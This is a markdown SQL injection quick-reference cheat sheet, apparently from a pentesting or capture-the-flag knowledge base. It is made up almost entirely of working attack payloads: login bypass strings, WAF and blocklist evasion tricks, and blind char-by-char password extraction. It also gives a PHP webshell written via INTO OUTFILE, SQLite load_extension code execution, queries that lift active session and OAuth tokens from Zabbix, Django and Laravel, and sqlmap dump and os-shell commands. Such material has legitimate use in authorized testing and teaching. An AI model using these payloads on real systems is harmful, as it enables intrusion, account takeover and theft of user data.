# SQL Injection — Quick Start

Quick-reference companion. For detailed scenarios see `injection-principles.md` and `INDEX.md`. Per-DBMS syntax and per-technique writeups are under `scenarios/sql/`.

## Quickest probes

```sql
'             "             \             ` 
'+OR+1=1--    " OR "1"="1   ' OR 1=1#
admin'--      admin'#       admin' OR '1'='1
{"$ne":""}    {"$gt":""}    (NoSQL operator probes)
```

## Authentication bypass (top picks)

```sql
admin'--                       (most common — comments out password check)
admin' OR '1'='1' --
' OR 1=1--
') OR ('1'='1
admin' UNION SELECT username,password FROM users--
```

See `scenarios/sql/auth-bypass.md`.

## WHERE filter bypass (retrieve hidden data)

```sql
' OR '1'='1                    (returns ALL rows, even with hidden filter)
' OR 1=1 --                    (numeric variant)
' UNION SELECT NULL,content,NULL FROM posts WHERE published=0 --
```

`AND` binds tighter than `OR`: `WHERE published=1 AND category='' OR '1'='1'` returns all rows. Test ALL parameters — search, sort, lang, region, tag — not just login. See `scenarios/sql/where-clause-filter-bypass.md`.

## Keyword blocklist bypass (non-recursive replace)

When the app removes keywords with `str.replace()` once:

```
SESELECTLECT   → SELECT
UNUNIONION     → UNION
OorR           → OR
AANDND         → AND
WHWHEREERE     → WHERE
```

Full payload:
```sql
' OorR '1'='1' --
' UNUNIONION SESELECTLECT * FRFROMOM users WHWHEREERE 1=1 --
```

## Regex WAF bypass (whitespace-anchored)

```sql
union(select 1,2,3)              -- no whitespace between union and select
union/**/select 1,2,3            -- comment as delimiter
union all(select 1,2,3)
union(select 0,0,0)              -- when null is also blocked
```

Test EACH WAF rule independently — `union select`, `null`, `information_schema` are usually 3 separate rules. See `scenarios/sql/waf-bypass.md`.

## Blind SQLi filter bypass (regex-blocked keywords)

When `preg_match` blocks `and|or|where|substring|substr` and spaces:

```sql
"/**/OR/**/1=1#                            -- /**/ replaces spaces
"/**/&&/**/mid(password,1,1)="T"#          -- && for AND, mid() for substring
admin"/**/&&/**/length(password)>10#       -- length probe
admin"/**/&&/**/mid(password,{pos},1)="{char}"#   -- char-by-char extract
```

MySQL `#` for comments (no trailing space). Check quote context — single vs double — by reading source. See `scenarios/sql/boolean-blind.md`.

## SQLite blind via `ORDER BY ${var}`

When source review finds raw template-literal interpolation into ORDER BY:

```sql
-- Boolean oracle: predicate flips between ascending and descending sort
CASE WHEN (<predicate>) THEN votes ELSE -votes END

-- Schema/data leak via sqlite_master:
CASE WHEN (SELECT substr(sql,N,1) FROM sqlite_master WHERE name='users')=char(C) THEN votes ELSE -votes END
```

Compare first row of response between the two states. ~7-10 requests/char via binary search.

## SQLite load_extension RCE / INTO OUTFILE webshell

```sql
-- SQLite (BI tools with enable_load_extension=True)
SELECT load_extension('/tmp/payload');           -- linux .so
SELECT load_extension('C:\\path\\to\\payload');   -- windows .dll (NO extension)

-- MySQL INTO OUTFILE (FILE priv + secure_file_priv empty)
'; SELECT '<?php system($_GET[0]); ?>' INTO OUTFILE '/var/www/html/shell.php'; --
```

See `sql-injection-advanced.md` for DLL source + chain.

## UNION column count

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

Continue until error disappears. See `scenarios/sql/union-based.md`.

## Hash injection auth bypass (UNION + bcrypt/argon2)

When login fetches a hash and compares via bcrypt:
1. `' UNION SELECT 1 -- -` → "Invalid salt" confirms hash compare on query result.
2. Generate hash you control: `python3 -c "import bcrypt; print(bcrypt.hashpw(b'test', bcrypt.gensalt()).decode())"`.
3. Inject: `' UNION SELECT '$2b$12$YOUR_HASH' -- -` with password=`test`.

## Skip password crack — steal active sessions

When SQLi reads `users` with bcrypt hashes, check session tables FIRST:

```sql
SELECT sessionid FROM sessions WHERE userid=1 AND status=0 ORDER BY lastaccess DESC LIMIT 1;   -- Zabbix
SELECT session_key FROM django_session WHERE expire_date > NOW();                              -- Django
SELECT id FROM oauth_access_tokens WHERE user_id=1 AND revoked=0;                              -- Laravel Passport
SELECT token FROM personal_access_tokens WHERE tokenable_id=1;                                 -- Laravel Sanctum
```

Replay as `Cookie: <name>=<token>`, `Authorization: Bearer <token>`, or `X-Auth-Token: <token>`.

## Blind boolean

```sql
' AND 1=1--    (True - "Welcome back" appears)
' AND 1=2--    (False)
' AND (SELECT 'a' FROM users WHERE username='administrator')='a'--
```

## Time-based (PostgreSQL)

```sql
'; SELECT pg_sleep(10)--
'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

## LIKE-based blind (when substr/mid fail)

```sql
AND (SELECT column FROM table LIMIT 0,1) LIKE 0x61%      -- starts with 'a'?
AND (SELECT column FROM table LIMIT 0,1) LIKE 0x6162%    -- starts with 'ab'?
-- Time-based wrapper:
AND IF((SELECT column FROM table LIMIT 0,1) LIKE 0x61%, sleep(3), 0)
```

Hex LIKE patterns avoid quote escaping issues.

## Per-DBMS quick syntax

| | MySQL | PostgreSQL | MSSQL | Oracle |
|---|---|---|---|---|
| Comment | `#` or `-- ` | `--` | `--` | `--` |
| Concat | `CONCAT()`/space | `\|\|` | `+` | `\|\|` |
| Sleep | `SLEEP(N)` | `pg_sleep(N)` | `WAITFOR DELAY '0:0:N'` | `dbms_pipe.receive_message('a',N)` |
| Version | `@@version` | `version()` | `@@version` | `BANNER FROM v$version` |
| Substring | `SUBSTRING(s,p,l)` | `SUBSTRING(s,p,l)` | `SUBSTRING(s,p,l)` | `SUBSTR(s,p,l)` |

See `scenarios/sql/per-dbms-{mysql,postgres,mssql,oracle}.md`.

## Burp Intruder for blind SQLi

**Boolean:** `§a§` payload position, simple list a-z/0-9, Grep Match "Welcome back".

**Time-based (CRITICAL):** Resource Pool → New pool → Max concurrent = 1. Sort by "Response received" column. ~10,000ms = match.

## Common gotchas / when to use what

- MySQL `--` needs trailing space; use `#`. Oracle needs `FROM dual` for literals. Time-based = single-thread only. WAFs use libinjection. `secure_file_priv` blocks INTO OUTFILE. Stacked queries: MSSQL/PG yes, MySQL/Oracle no.
- **UNION** for visible results; **Boolean blind** for true/false response diff; **Time-based** for no diff/no errors; **Error-based** for verbose errors; **OOB** for async / when else fails.

## sqlmap quick wins

```bash
sqlmap -u "http://target/?id=1" --batch
sqlmap -u "http://target/?id=1" --dbs
sqlmap -u "http://target/?id=1" -D dbname -T users --dump
sqlmap -u "http://target/?id=1" --tamper=space2comment
sqlmap -u "http://target/?id=1" --os-shell
sqlmap -r request.txt --batch
```

## Resources

- `injection-principles.md`, `INDEX.md`.
- PortSwigger SQLi cheat sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet
